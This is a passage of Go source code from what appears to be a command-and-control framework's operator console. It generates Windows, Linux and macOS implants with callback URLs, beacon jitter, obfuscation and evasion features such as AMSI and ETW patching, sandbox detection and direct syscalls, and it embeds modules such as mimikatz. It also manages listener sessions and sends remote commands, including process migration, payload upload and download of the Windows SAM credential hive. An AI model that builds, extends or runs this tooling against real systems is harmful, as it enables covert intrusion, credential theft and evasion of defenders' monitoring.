			"  Usage: kill <job_id>\n"+
			"  Use 'jobs' command to list all active jobs with their IDs", args[0])
	}

	// Get job to check type before stopping
	job := is.jobManager.GetJob(jobID)
	if job == nil {
		// Check if it's a persistent job in database
		dbJobs, err := database.GetListenerJobs()
		if err == nil {
			for _, dbJob := range dbJobs {
				if dbJob.JobID == jobID {
					// Mark as stopped in database
					dbJob.Status = "stopped"
					if updateErr := database.UpdateListenerJob(dbJob); updateErr != nil {
						return fmt.Errorf("failed to mark job as stopped in database: %v", updateErr)
					}
					fmt.Printf("[+] Marked persistent job %d as stopped\n", jobID)
					return nil
				}
			}
		}
		return fmt.Errorf("job not found: %d\n"+
			"  Use 'jobs' command to list all active and persistent jobs", jobID)
	}

	// If it's a listener job, mark it as stopped in the database
	if job.Type == jobs.JobTypeListener {
		// Find listener job in database by JobID
		db, dbErr := database.GetDB()
		if dbErr == nil {
			var listenerJob database.ListenerJob
			if dbErr := db.Where("job_id = ?", jobID).First(&listenerJob).Error; dbErr == nil {
				listenerJob.Status = "stopped"
				if updateErr := database.UpdateListenerJob(&listenerJob); updateErr != nil {
					is.logger.Error("Failed to mark listener job as stopped in database: %v", updateErr)
				}
			}
		}
	}

	if err := is.jobManager.StopJob(jobID); err != nil {
		return fmt.Errorf("failed to stop job: %w", err)
	}

	fmt.Printf("[+] Stopped job %d\n", jobID)
	return nil
}

func (is *InteractiveServer) handleGenerate(args []string) error {
	if len(args) < 3 {
		return fmt.Errorf("insufficient arguments\n" +
			"  Usage: generate <type> <os> <arch> [options]\n" +
			"  Types: stager, shellcode, full\n" +
			"  OS: linux, windows, darwin\n" +
			"  Arch: amd64, 386, arm64\n" +
			"  Options:\n" +
			"    --output, -o <path>      Output file path\n" +
			"    --callback, -c <url>     Callback URL (http://host:port or https://host:port)\n" +
			"    --delay, -d <seconds>    Beacon delay in seconds (default: 10)\n" +
			"    --jitter, -j <0.0-1.0>   Jitter percentage (default: 0.0)\n" +
			"    --user-agent, -u <ua>    Custom user agent string\n" +
			"    --protocol, -p <proto>   Protocol: http, https, mtls (default: http)\n" +
			"    --no-encrypt            Disable encryption\n" +
			"    --no-obfuscate          Disable obfuscation\n" +
			"    --debug                 Enable debug mode (console window, verbose logging, no obfuscation)\n" +
			"    --modules, -m <ids>      Comma-separated Empire module IDs to embed\n" +
			"    --evasion <options>      Evasion features (comma-separated)\n" +
			"                             Options: sandbox,debugger,vm,etw,amsi,sleepmask,syscalls\n" +
			"  Examples:\n" +
			"    generate full windows amd64 --callback http://192.168.1.100:8443\n" +
			"    generate stager windows amd64 -o /tmp/implant.exe -c https://example.com:443\n" +
			"    generate full windows amd64 --callback 192.168.1.100:8443 --delay 60 --jitter 0.3\n" +
			"    generate full windows amd64 -c http://192.168.1.100:8443 --modules powershell/credentials/mimikatz\n" +
			"    generate full windows amd64 -c http://192.168.1.100:8443 --evasion sandbox,debugger,vm\n" +
			"    generate full windows amd64 -c http://192.168.1.100:8443 --debug")
	}

	payloadType := strings.ToLower(args[0])
	osTarget := strings.ToLower(args[1])
	arch := strings.ToLower(args[2])

	// Validate payload type
	validTypes := map[string]bool{"stager": true, "shellcode": true, "full": true}
	if !validTypes[payloadType] {
		return fmt.Errorf("invalid payload type '%s'\n"+
			"  Valid types: stager, shellcode, full\n"+
			"  Usage: generate <type> <os> <arch> [options]\n"+
			"  Example: generate full windows amd64 --callback http://192.168.1.100:8443", args[0])
	}

	// Validate OS
	validOS := map[string]bool{"linux": true, "windows": true, "darwin": true}
	if !validOS[osTarget] {
		return fmt.Errorf("invalid OS '%s'\n"+
			"  Valid OS: linux, windows, darwin\n"+
			"  Usage: generate <type> <os> <arch> [options]\n"+
			"  Example: generate full windows amd64 --callback http://192.168.1.100:8443", args[1])
	}

	// Validate architecture
	validArch := map[string]bool{"amd64": true, "386": true, "arm64": true}
	if !validArch[arch] {
		return fmt.Errorf("invalid architecture '%s'\n"+
			"  Valid architectures: amd64, 386, arm64\n"+
			"  Usage: generate <type> <os> <arch> [options]\n"+
			"  Example: generate full windows amd64 --callback http://192.168.1.100:8443", args[2])
	}

	// Parse flags
	var outputPath string
	var callbackURL string
	var delay int
	var jitter float64
	var userAgent string
	var protocol string
	var modulesStr string
	var evasionStr string
	encrypt := true
	obfuscate := true
	debug := false

	for i := 3; i < len(args); i++ {
		switch args[i] {
		case "--output", "-o":
			if i+1 < len(args) {
				outputPath = args[i+1]
				if outputPath == "" {
					return fmt.Errorf("output path cannot be empty\n" +
						"  Usage: --output <path>\n" +
						"  Example: --output /tmp/implant.exe")
				}
				i++
			} else {
				return fmt.Errorf("missing value for --output flag\n" +
					"  Usage: --output <path>\n" +
					"  Example: --output /tmp/implant.exe")
			}
		case "--callback", "-c":
			if i+1 < len(args) {
				callbackURL = args[i+1]
				// Validate callback URL format
				if err := validateCallbackURL(callbackURL); err != nil {
					return fmt.Errorf("invalid callback URL '%s': %w\n"+
						"  Expected format: <protocol>://<host>[:<port>]\n"+
						"  Valid protocols: http, https\n"+
						"  Examples:\n"+
						"    http://192.168.1.100:8443\n"+
						"    https://example.com:443\n"+
						"    http://c2.example.com\n"+
						"  Note: Port must be between 1 and 65535 if specified", callbackURL, err)
				}
				i++
			}
		case "--delay", "-d":
			if i+1 < len(args) {
				if _, err := fmt.Sscanf(args[i+1], "%d", &delay); err != nil {
					return fmt.Errorf("invalid delay value '%s': must be a number\n"+
						"  Usage: --delay <seconds>\n"+
						"  Example: --delay 60", args[i+1])
				}
				if delay < 0 {
					return fmt.Errorf("delay must be >= 0, got %d", delay)
				}
				i++
			} else {
				return fmt.Errorf("missing value for --delay flag\n" +
					"  Usage: --delay <seconds>\n" +
					"  Example: --delay 60")
			}
		case "--jitter", "-j":
			if i+1 < len(args) {
				if _, err := fmt.Sscanf(args[i+1], "%f", &jitter); err != nil {
					return fmt.Errorf("invalid jitter value '%s': must be a number\n"+
						"  Usage: --jitter <0.0-1.0>\n"+
						"  Example: --jitter 0.3", args[i+1])
				}
				if jitter < 0 || jitter > 1 {
					return fmt.Errorf("jitter must be between 0.0 and 1.0, got %.2f", jitter)
				}
				i++
			} else {
				return fmt.Errorf("missing value for --jitter flag\n" +
					"  Usage: --jitter <0.0-1.0>\n" +
					"  Example: --jitter 0.3")
			}
		case "--user-agent", "-u":
			if i+1 < len(args) {
				userAgent = args[i+1]
				if userAgent == "" {
					return fmt.Errorf("user agent cannot be empty\n" +
						"  Usage: --user-agent <string>\n" +
						"  Example: --user-agent 'Mozilla/5.0'")
				}
				i++
			} else {
				return fmt.Errorf("missing value for --user-agent flag\n" +
					"  Usage: --user-agent <string>\n" +
					"  Example: --user-agent 'Mozilla/5.0'")
			}
		case "--protocol", "-p":
			if i+1 < len(args) {
				protocol = strings.ToLower(args[i+1])
				validProtocols := map[string]bool{"http": true, "https": true, "mtls": true}
				if !validProtocols[protocol] {
					return fmt.Errorf("invalid protocol '%s'\n"+
						"  Valid protocols: http, https, mtls\n"+
						"  Usage: --protocol <protocol>\n"+
						"  Example: --protocol https", args[i+1])
				}
				i++
			} else {
				return fmt.Errorf("missing value for --protocol flag\n" +
					"  Usage: --protocol <http|https|mtls>\n" +
					"  Example: --protocol https")
			}
		case "--modules", "-m":
			if i+1 < len(args) {
				modulesStr = args[i+1]
				if modulesStr == "" {
					return fmt.Errorf("modules list cannot be empty\n" +
						"  Usage: --modules <id1,id2,...>\n" +
						"  Example: --modules powershell/credentials/mimikatz")
				}
				i++
			} else {
				return fmt.Errorf("missing value for --modules flag\n" +
					"  Usage: --modules <id1,id2,...>\n" +
					"  Example: --modules powershell/credentials/mimikatz")
			}
		case "--evasion":
			if i+1 < len(args) {
				evasionStr = args[i+1]
				if evasionStr == "" {
					return fmt.Errorf("evasion options cannot be empty\n" +
						"  Usage: --evasion <option1,option2,...>\n" +
						"  Valid options: sandbox,debugger,vm,etw,amsi,sleepmask,syscalls\n" +
						"  Example: --evasion sandbox,debugger,vm")
				}
				i++
			} else {
				return fmt.Errorf("missing value for --evasion flag\n" +
					"  Usage: --evasion <option1,option2,...>\n" +
					"  Valid options: sandbox,debugger,vm,etw,amsi,sleepmask,syscalls\n" +
					"  Example: --evasion sandbox,debugger,vm")
			}
		case "--no-encrypt":
			encrypt = false
		case "--no-obfuscate":
			obfuscate = false
		case "--debug":
			debug = true
			// Debug mode automatically disables obfuscation
			obfuscate = false
		}
	}

	// Parse modules
	var modules []string
	if modulesStr != "" {
		modules = strings.Split(modulesStr, ",")
		// Trim whitespace
		for i, m := range modules {
			modules[i] = strings.TrimSpace(m)
		}
	}

	// Parse evasion options
	var evasion *payload.EvasionConfig
	if evasionStr != "" {
		evasion = &payload.EvasionConfig{}
		evasionOptions := strings.Split(evasionStr, ",")
		for _, opt := range evasionOptions {
			switch strings.TrimSpace(strings.ToLower(opt)) {
			case "sandbox":
				evasion.EnableSandboxDetection = true
			case "debugger":
				evasion.EnableDebuggerCheck = true
			case "vm":
				evasion.EnableVMDetection = true
			case "etw":
				evasion.EnableETWPatches = true
			case "amsi":
				evasion.EnableAMSI = true
			case "sleepmask":
				evasion.SleepMask = true
			case "syscalls":
				evasion.DirectSyscalls = true
			}
		}
	}

	// Set default output path if not provided
	if outputPath == "" {
		outputDir := "./implants"
		if err := os.MkdirAll(outputDir, 0755); err != nil {
			return fmt.Errorf("failed to create default output directory '%s': %w\n"+
				"  Solution: Check directory permissions or specify a different path with --output", outputDir, err)
		}

		ext := ".bin"
		if osTarget == "windows" {
			ext = ".exe"
		}

		outputPath = filepath.Join(outputDir, fmt.Sprintf("implant_%s_%s_%s_%d%s",
			payloadType, osTarget, arch, time.Now().Unix(), ext))
	}

	fmt.Printf("[*] Generating %s payload for %s/%s...\n", payloadType, osTarget, arch)
	if callbackURL != "" {
		fmt.Printf("[*] Callback URL: %s\n", callbackURL)
	}
	if delay > 0 {
		fmt.Printf("[*] Delay: %d seconds\n", delay)
	}
	if jitter > 0 {
		fmt.Printf("[*] Jitter: %.1f%%\n", jitter*100)
	}
	fmt.Printf("[*] Output: %s\n", outputPath)

	options := payload.Options{
		Type:        payloadType,
		Arch:        arch,
		OS:          osTarget,
		Encrypt:     encrypt,
		Obfuscate:   obfuscate,
		Debug:       debug,
		Config:      is.config,
		CallbackURL: callbackURL,
		Delay:       delay,
		Jitter:      jitter,
		UserAgent:   userAgent,
		Protocol:    protocol,
		Modules:     modules,
		Evasion:     evasion,
	}

	gen := payload.NewGenerator(is.logger, is.moduleRegistry)
	data, err := gen.Generate(options)
	if err != nil {
		return fmt.Errorf("generation failed: %w", err)
	}

	// Ensure output directory exists
	outputDir := filepath.Dir(outputPath)
	if err := os.MkdirAll(outputDir, 0755); err != nil {
		return fmt.Errorf("failed to create output directory: %w", err)
	}

	if err := os.WriteFile(outputPath, data, 0755); err != nil {
		return fmt.Errorf("failed to write payload: %w", err)
	}

	// Save build to database
	modulesJSON, err := json.Marshal(options.Modules)
	if err != nil {
		is.logger.Error("Failed to marshal modules: %v", err)
		modulesJSON = []byte("[]") // Default to empty array on error
	}
	evasionJSON, err := json.Marshal(options.Evasion)
	if err != nil {
		is.logger.Error("Failed to marshal evasion: %v", err)
		evasionJSON = []byte("[]") // Default to empty array on error
	}

	build := &database.ImplantBuild{
		Name:        filepath.Base(outputPath),
		Type:        payloadType,
		OS:          osTarget,
		Arch:        arch,
		CallbackURL: callbackURL,
		Delay:       delay,
		Jitter:      jitter,
		UserAgent:   userAgent,
		Protocol:    protocol,
		OutputPath:  outputPath,
		Size:        int64(len(data)),
		Modules:     string(modulesJSON),
		Evasion:     string(evasionJSON),
	}

	if err := database.SaveImplantBuild(build); err != nil {
		is.logger.Error("Failed to save build to database: %v", err)
		// Continue anyway - build succeeded
	}

	fmt.Printf("[+] Payload generated successfully!\n")
	fmt.Printf("[+] Size: %d bytes\n", len(data))
	fmt.Printf("[+] Saved to: %s\n", outputPath)

	return nil
}

func (is *InteractiveServer) handleJobs(args []string) error {
	// Check for kill flag
	if len(args) > 0 {
		if args[0] == "--kill" || args[0] == "-k" {
			if len(args) < 2 {
				return fmt.Errorf("job ID required\n" +
					"  Usage: jobs --kill <job_id> or jobs -k <job_id>\n" +
					"  Example: jobs --kill 3")
			}
			// Call handleKill with the job ID
			return is.handleKill([]string{args[1]})
		}
		return fmt.Errorf("unknown jobs option: %s\n"+
			"  Usage: jobs [--kill|-k <job_id>]\n"+
			"  Example: jobs\n"+
			"  Example: jobs --kill 3", args[0])
	}

	// No flags - just print jobs
	is.printJobs()
	return nil
}

func (is *InteractiveServer) printJobs() {
	// Get active jobs from job manager
	activeJobs := is.jobManager.ListJobs()

	// Get all persistent jobs from database
	dbJobs, err := database.GetListenerJobs()
	if err != nil {
		is.logger.Error("Failed to get persistent jobs: %v", err)
	}

	// Combine active jobs and database jobs
	allJobs := make(map[uint64]*jobs.Job)
	for _, job := range activeJobs {
		allJobs[job.ID] = job
		// Update database status to running for active jobs
		if job.Type == jobs.JobTypeListener {
			// Find matching DB job by JobID
			for _, dbJ := range dbJobs {
				if dbJ.JobID == job.ID {
					if dbJ.Status != "running" {
						dbJ.Status = "running"
						database.UpdateListenerJob(dbJ)
					}
					break
				}
			}
		}
	}

	// Add database jobs (those not in active jobs are inactive/stopped)
	for _, dbJob := range dbJobs {
		if _, exists := allJobs[dbJob.JobID]; !exists {
			// This is a persistent job that's not currently active
			// Create a job representation for display
			jobName := fmt.Sprintf("%s listener on %s:%d", dbJob.Type, dbJob.Host, dbJob.Port)
			status := jobs.JobStatus(dbJob.Status)
			if status != jobs.JobStatusRunning && status != jobs.JobStatusStopped {
				status = jobs.JobStatusStopped // Default to stopped if invalid
			}
			allJobs[dbJob.JobID] = &jobs.Job{
				ID:        dbJob.JobID,
				Type:      jobs.JobTypeListener,
				Name:      jobName,
				Status:    status,
				CreatedAt: time.Unix(dbJob.CreatedAt, 0),
			}
		}
	}

	if len(allJobs) == 0 {
		fmt.Println("[*] No jobs (active or persistent)")
		return
	}

	// Sort jobs by ID for consistent display
	sortedJobs := make([]*jobs.Job, 0, len(allJobs))
	for _, job := range allJobs {
		sortedJobs = append(sortedJobs, job)
	}

	// Sort by ID
	sort.Slice(sortedJobs, func(i, j int) bool {
		return sortedJobs[i].ID < sortedJobs[j].ID
	})

	t := table.NewWriter()
	t.SetStyle(table.StyleColoredBright)
	t.AppendHeader(table.Row{"ID", "Type", "Name", "Status", "Created"})

	for _, job := range sortedJobs {
		statusColor := ""
		if job.Status == jobs.JobStatusRunning {
			statusColor = "\033[92m" // Green
		} else if job.Status == jobs.JobStatusStopped {
			statusColor = "\033[91m" // Red
		}
		resetColor := "\033[0m"

		t.AppendRow(table.Row{
			job.ID,
			string(job.Type),
			job.Name,
			statusColor + string(job.Status) + resetColor,
			job.CreatedAt.Format("2006-01-02 15:04:05"),
		})
	}

	fmt.Println(t.Render())
}

func (is *InteractiveServer) printSessions() {
	sessionList := is.sessionMgr.ListSessions()

	if len(sessionList) == 0 {
		fmt.Println("[*] No active sessions")
		return
	}

	// Check for dead sessions (haven't been seen in 5 minutes)
	now := time.Now()
	deadTimeout := 5 * time.Minute
	for _, session := range sessionList {
		if now.Sub(session.LastSeen) > deadTimeout {
			session.SetState(core.SessionStateDead)
		}
	}

	t := table.NewWriter()
	t.SetStyle(table.StyleColoredDark)

	// Dark header with white text using ANSI codes
	headerRow := table.Row{
		"\033[1;34mID\033[0m",          // Bold dark blue
		"\033[1;34mType\033[0m",        // Bold dark blue
		"\033[1;34mUser\033[0m",        // Bold dark blue
		"\033[1;34mPrivilege\033[0m",   // Bold dark blue
		"\033[1;34mTransport\033[0m",   // Bold dark blue
		"\033[1;34mRemote Addr\033[0m", // Bold dark blue
		"\033[1;34mConnected\033[0m",   // Bold dark blue
		"\033[1;34mLast Seen\033[0m",   // Bold dark blue
		"\033[1;34mState\033[0m",       // Bold dark blue
	}
	t.AppendHeader(headerRow)

	for _, session := range sessionList {
		// Get remote address from metadata if not set directly
		remoteAddr := session.RemoteAddr
		if remoteAddr == "" {
			if addr, ok := session.GetMetadata("remote_addr"); ok {
				if addrStr, ok := addr.(string); ok {
					remoteAddr = addrStr
				}
			}
		}

		state := session.GetState()
		stateStr := string(state)

		// Get username and privilege level
		username := session.GetUsername()
		if username == "" {
			if userMeta, ok := session.GetMetadata("username"); ok {
				if userStr, ok := userMeta.(string); ok {
					username = userStr
				}
			}
			if username == "" {
				username = "N/A"
			}
		}

		privLevel := session.GetPrivilegeLevel()
		if privLevel == core.PrivilegeUnknown {
			// Try to determine from metadata
			if privMeta, ok := session.GetMetadata("privilege_level"); ok {
				if privStr, ok := privMeta.(string); ok {
					privLevel = core.PrivilegeLevel(privStr)
				}
			}
		}

		// Color code rows: dark colors for better readability
		var colorCode string
		if state == core.SessionStateDead {
			colorCode = "\033[31m" // Dark red for dead sessions
		} else {
			colorCode = "\033[37m" // White/light gray for active sessions
		}
		resetCode := "\033[0m"

		// Color code privilege level with dark colors
		var privColor string
		var privDisplay string
		switch privLevel {
		case core.PrivilegeSystem:
			privColor = "\033[35m" // Dark magenta for SYSTEM
			privDisplay = "SYSTEM"
		case core.PrivilegeAdmin:
			privColor = "\033[33m" // Dark yellow for Admin
			privDisplay = "Admin"
		case core.PrivilegeUser:
			privColor = "\033[36m" // Dark cyan for User
			privDisplay = "User"
		default:
			privColor = "\033[90m" // Dark gray for Unknown
			privDisplay = "Unknown"
		}

		row := table.Row{
			colorCode + shortID(session.ID) + resetCode,
			colorCode + string(session.Type) + resetCode,
			colorCode + username + resetCode,
			privColor + privDisplay + resetCode,
			colorCode + session.Transport + resetCode,
			colorCode + remoteAddr + resetCode,
			colorCode + session.ConnectedAt.Format("15:04:05") + resetCode,
			colorCode + session.LastSeen.Format("15:04:05") + resetCode,
			colorCode + stateStr + resetCode,
		}

		t.AppendRow(row)
	}

	fmt.Println(t.Render())
}

func (is *InteractiveServer) handleUse(args []string) error {
	if len(args) == 0 {
		if is.currentSession != "" {
			fmt.Printf("[*] Currently using session: %s\n", shortID(is.currentSession))
			fmt.Println("[*] Type 'back' to exit session")
			return nil
		}
		return fmt.Errorf("insufficient arguments\n" +
			"  Usage: use <session_id>\n" +
			"  Use 'sessions' command to list all active sessions\n" +
			"  Example: use sess-123\n" +
			"  Note: You can use partial session IDs (first 8 characters)")
	}

	if args[0] == "back" {
		if is.currentSession != "" {
			fmt.Printf("[*] Exited session %s\n", shortID(is.currentSession))
			is.currentSession = ""
		} else {
			fmt.Println("[*] Not in a session")
		}
		return nil
	}

	sessionID := args[0]
	if sessionID == "" {
		return fmt.Errorf("session ID cannot be empty\n" +
			"  Usage: use <session_id>\n" +
			"  Use 'sessions' command to list all active sessions")
	}

	session, ok := is.sessionMgr.GetSession(sessionID)
	if !ok {
		return fmt.Errorf("session not found: %s\n"+
			"  Use 'sessions' command to list all active sessions\n"+
			"  Note: You can use partial session IDs (first 8 characters)", sessionID)
	}

	is.currentSession = sessionID
	fmt.Printf("[+] Using session %s\n", shortID(sessionID))
	fmt.Printf("    Type: %s\n", session.Type)
	fmt.Printf("    Transport: %s\n", session.Transport)
	fmt.Printf("    Remote: %s\n", session.RemoteAddr)
	fmt.Println("[*] Type commands to execute on session")
	fmt.Println("[*] Type 'back' to exit session")
	fmt.Println()

	// Enter interactive shell for session
	return is.sessionShell(sessionID)
}

func (is *InteractiveServer) sessionShell(sessionID string) error {
	if !is.isServerRunning() || is.server == nil {
		return fmt.Errorf("server not running")
	}

	// Create session-specific readline input with separate history file
	sessionPrompt := fmt.Sprintf("[ditto %s] > ", shortID(sessionID))
	var sessionInput interactive.InputReader

	// Use session-specific history file to prevent history bleeding into main CLI
	sessionHistoryPath := interactive.GetSessionHistoryPath()
	rlInput, err := interactive.NewReadlineInputWithCompleterAndHistory(sessionPrompt, is.completer, sessionHistoryPath)
	if err != nil {
		// Fallback to simple input
		sessionInput = interactive.NewFallbackInput(sessionPrompt)
	} else {
		sessionInput = rlInput
	}
	defer func() {
		if sessionInput != nil {
			sessionInput.Close()
		}
	}()

	for {
		if is.currentSession != sessionID {
			break // Session changed
		}

		if sessionInput == nil {
			fmt.Printf("[!] Error: session input handler not initialized\n")
			break
		}

		// Validate session still exists before executing commands
		if _, ok := is.sessionMgr.GetSession(sessionID); !ok {
			fmt.Printf("[!] Session %s no longer exists\n", shortID(sessionID))
			is.currentSession = ""
			break
		}

		line, err := sessionInput.ReadLine()
		if err != nil {
			if err == io.EOF {
				break
			}
			fmt.Printf("[!] Error reading input: %v\n", err)
			continue
		}

		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}

		if line == "back" || line == "exit" {
			is.currentSession = ""
			break
		}

		parts := strings.Fields(line)
		if len(parts) == 0 {
			continue
		}

		command := parts[0]
		args := parts[1:]

		switch command {
		case "shell", "exec":
			if len(args) == 0 || (len(args) == 1 && (args[0] == "cmd.exe" || args[0] == "cmd" || args[0] == "powershell.exe" || args[0] == "powershell" || args[0] == "pwsh")) {
				// Interactive shell mode - start persistent shell
				shellCmd := "cmd.exe"
				if len(args) == 1 {
					if args[0] == "powershell.exe" || args[0] == "powershell" || args[0] == "pwsh" {
						shellCmd = "powershell.exe"
					}
				}
				if err := is.startInteractiveShell(sessionID, shellCmd); err != nil {
					fmt.Printf("[!] Error starting interactive shell: %v\n", err)
				}
				continue
			}
			_, err := is.executeShellCommand(sessionID, strings.Join(args, " "))
			if err != nil {
				fmt.Printf("[!] Error: %v\n", err)
			} else {
				// Task queued - result will be displayed automatically via events
				fmt.Printf("[*] Task queued. Result will appear automatically when ready.\n")
			}
		case "module", "run":
			if len(args) < 1 {
				fmt.Println("[!] Error: Module ID is required")
				fmt.Println("    Usage: module <module_id> [args...]")
				fmt.Println("    Example: module powershell/credentials/mimikatz")
				fmt.Println("    Use 'modules' command to list available modules")
				continue
			}
			_, err := is.executeModule(sessionID, args[0], args[1:])
			if err != nil {
				fmt.Printf("[!] Error: %v\n", err)
			} else {
				// Module execution is asynchronous - result will be displayed automatically via events
				fmt.Printf("[*] Module queued. Result will appear automatically when ready.\n")
			}
		case "download":
			if len(args) < 1 {
				fmt.Println("[!] Error: Remote path is required")
				fmt.Println("    Usage: download <remote_path>")
				fmt.Println("    Example: download C:\\Windows\\System32\\config\\sam")
				continue
			}
			if err := is.downloadFile(sessionID, args[0]); err != nil {
				fmt.Printf("[!] Error: %v\n", err)
			}
		case "upload":
			if len(args) < 2 {
				fmt.Println("[!] Error: Both local and remote paths are required")
				fmt.Println("    Usage: upload <local_path> <remote_path>")
				fmt.Println("    Example: upload /tmp/payload.exe C:\\Windows\\Temp\\payload.exe")
				continue
			}
			if err := is.uploadFile(sessionID, args[0], args[1]); err != nil {
				fmt.Printf("[!] Error: %v\n", err)
			}
		case "migrate":
			if len(args) < 1 {
				fmt.Println("[!] Error: Process ID is required")
				fmt.Println("    Usage: migrate <pid>")
				fmt.Println("    Example: migrate 1234")
				continue
			}
			pid, err := strconv.Atoi(args[0])
			if err != nil {
				fmt.Printf("[!] Error: Invalid process ID '%s': must be a number\n", args[0])
				fmt.Println("    Usage: migrate <pid>")
				fmt.Println("    Example: migrate 1234")
				continue
			}
			if pid <= 0 {
				fmt.Printf("[!] Error: Invalid process ID: %d (must be positive)\n", pid)
				fmt.Println("    Usage: migrate <pid>")
				fmt.Println("    Example: migrate 1234")
				continue
			}
			if err := is.migrateProcess(sessionID, pid); err != nil {
				fmt.Printf("[!] Error: %v\n", err)
			}
		case "cat":
			if len(args) < 1 {
				fmt.Println("[!] Error: File path is required")
				fmt.Println("    Usage: cat <path>")
				fmt.Println("    Example: cat /etc/passwd")
				continue
			}
			if err := is.executeFilesystemOp(sessionID, "cat", args[0]); err != nil {
				fmt.Printf("[!] Error: %v\n", err)
			}
		case "head":
			if len(args) < 1 {
				fmt.Println("[!] Error: File path is required")
				fmt.Println("    Usage: head <path> [lines]")
				fmt.Println("    Example: head /etc/passwd 20")
				continue
			}
			lines := 10
			if len(args) >= 2 {
				n, err := strconv.Atoi(args[1])
				if err != nil {
					fmt.Printf("[!] Error: Invalid line count '%s': must be a number\n", args[1])
					fmt.Println("    Usage: head <path> [lines]")
					fmt.Println("    Example: head /etc/passwd 20")
					continue
				}
				if n <= 0 {
					fmt.Printf("[!] Error: Line count must be positive, got %d\n", n)
					fmt.Println("    Usage: head <path> [lines]")
					fmt.Println("    Example: head /etc/passwd 20")
					continue
				}
				lines = n
			}
			if err := is.executeFilesystemOp(sessionID, "head", args[0], fmt.Sprintf("%d", lines)); err != nil {
				fmt.Printf("[!] Error: %v\n", err)
			}
		case "tail":
			if len(args) < 1 {
				fmt.Println("[!] Error: File path is required")
				fmt.Println("    Usage: tail <path> [lines]")
				fmt.Println("    Example: tail /var/log/syslog 50")
				continue
			}
			lines := 10
			if len(args) >= 2 {
				n, err := strconv.Atoi(args[1])
				if err != nil {
					fmt.Printf("[!] Error: Invalid line count '%s': must be a number\n", args[1])
					fmt.Println("    Usage: tail <path> [lines]")
					fmt.Println("    Example: tail /var/log/syslog 50")
					continue
				}
				if n <= 0 {
					fmt.Printf("[!] Error: Line count must be positive, got %d\n", n)
					fmt.Println("    Usage: tail <path> [lines]")
					fmt.Println("    Example: tail /var/log/syslog 50")
					continue
				}
				lines = n
			}
			if err := is.executeFilesystemOp(sessionID, "tail", args[0], fmt.Sprintf("%d", lines)); err != nil {
				fmt.Printf("[!] Error: %v\n", err)
			}
		case "grep":
			if len(args) < 2 {
				fmt.Println("[!] Error: Both pattern and path are required")
				fmt.Println("    Usage: grep <pattern> <path>")
				fmt.Println("    Example: grep 'ERROR' /var/log/app.log")
				continue
			}
			if err := is.executeFilesystemOp(sessionID, "grep", args[1], args[0]); err != nil {
				fmt.Printf("[!] Error: %v\n", err)
			}
		case "modules":
			allModules := is.moduleRegistry.ListAllModules()
			if len(allModules) == 0 {
				fmt.Println("[*] No modules loaded")
				fmt.Println("    Modules are loaded automatically from modules/ directory")
				continue
			}

			// Group by category
			byCategory := make(map[string][]*modules.EmpireModule)
			for _, mod := range allModules {
				category := string(mod.Category)
				byCategory[category] = append(byCategory[category], mod)
			}

			// Display categories first
			fmt.Printf("[*] Available module categories (%d modules total):\n\n", len(allModules))

			categories := make([]string, 0, len(byCategory))
			for cat := range byCategory {
				categories = append(categories, cat)
			}
			sort.Strings(categories)

			for i, category := range categories {
				mods := byCategory[category]
				fmt.Printf("  %d. %s (%d modules)\n", i+1, category, len(mods))
			}

			fmt.Println("\n[*] To view modules in a category, use: modules <category> or modules <number>")
			fmt.Println("    Example: modules privesc")
			fmt.Println("    Example: modules 1")
			fmt.Println("    Or use: modules <module_id> to get details")
			fmt.Println("    Example: modules powershell/privesc/getsystem")

			// If category specified, show modules in that category
			if len(args) > 0 {
				arg := args[0]
				var foundCategory string

				// Check if it's a numeric category selection
				if categoryNum, err := strconv.Atoi(arg); err == nil {
					// It's a number - find category by index
					if categoryNum > 0 && categoryNum <= len(categories) {
						foundCategory = categories[categoryNum-1]
					} else {
						fmt.Printf("[!] Invalid category number: %d (must be between 1 and %d)\n", categoryNum, len(categories))
						continue
					}
				} else {
					// Try to find matching category by name
					categoryName := strings.ToLower(arg)
					for cat := range byCategory {
						if strings.ToLower(cat) == categoryName {
							foundCategory = cat
							break
						}
					}
				}

				if foundCategory != "" {
					fmt.Printf("\n[*] Modules in category '%s':\n\n", foundCategory)
					mods := byCategory[foundCategory]
					sort.Slice(mods, func(i, j int) bool {
						return mods[i].ID < mods[j].ID
					})

					// Build ordered list of all modules for global numbering
					orderedModules := make([]*modules.EmpireModule, 0, len(allModules))
					for _, category := range categories {
						catMods := byCategory[category]
						sort.Slice(catMods, func(i, j int) bool {
							return catMods[i].ID < catMods[j].ID
						})
						orderedModules = append(orderedModules, catMods...)
					}

					// Build a map of module to global index
					moduleToIndex := make(map[*modules.EmpireModule]int)
					for i, mod := range orderedModules {
						moduleToIndex[mod] = i + 1 // 1-based indexing
					}

					for _, mod := range mods {
						// Show global index number
						globalIndex := moduleToIndex[mod]
						fmt.Printf("  %d. ID: %s\n", globalIndex, mod.ID)
						if mod.Name != "" && mod.Name != mod.ID {
							fmt.Printf("     Name: %s\n", mod.Name)
						}
						if mod.Description != "" {
							// Truncate long descriptions
							desc := mod.Description
							if len(desc) > 80 {
								desc = desc[:77] + "..."
							}
							fmt.Printf("     Description: %s\n", desc)
						}
						fmt.Println()
					}
				} else {
					// Try to find module by ID
					moduleID := arg
					module, found := is.moduleRegistry.GetModuleByPath(moduleID)
					if !found {
						module, found = is.moduleRegistry.GetModule(moduleID)
					}

					if found {
						fmt.Printf("\n[*] Module Details:\n\n")
						fmt.Printf("  ID: %s\n", module.ID)
						fmt.Printf("  Name: %s\n", module.Name)
						if module.Description != "" {
							fmt.Printf("  Description: %s\n", module.Description)
						}
						fmt.Printf("  Language: %s\n", module.Language)
						fmt.Printf("  Category: %s\n", module.Category)
						if module.NeedsAdmin {
							fmt.Printf("  Requires Admin: Yes\n")
						}
						if len(module.Options) > 0 {
							fmt.Printf("\n  Options:\n")
							for _, opt := range module.Options {
								if !opt.Internal {
									required := ""
									if opt.Required {
										required = " (required)"
									}
									fmt.Printf("    %s%s: %s\n", opt.Name, required, opt.Description)
									if opt.Value != "" {
										fmt.Printf("      Default: %s\n", opt.Value)
									}
								}
							}
						}
					} else {
						fmt.Printf("[!] Category or module not found: %s\n", arg)
						fmt.Println("    Use 'modules' to see available categories")
					}
				}
			}
		case "queue", "tasks":
			if is.server == nil {
				fmt.Println("[!] Error: Server not initialized")
				continue
			}

			// Get all tasks for this session (not just pending)
			allTasks := is.taskQueue.GetAll()
			sessionTasks := make([]*tasks.Task, 0)
			for _, task := range allTasks {
				if task.Parameters != nil {
					if taskSessionID, ok := task.Parameters["session_id"].(string); ok {
						if taskSessionID == sessionID {
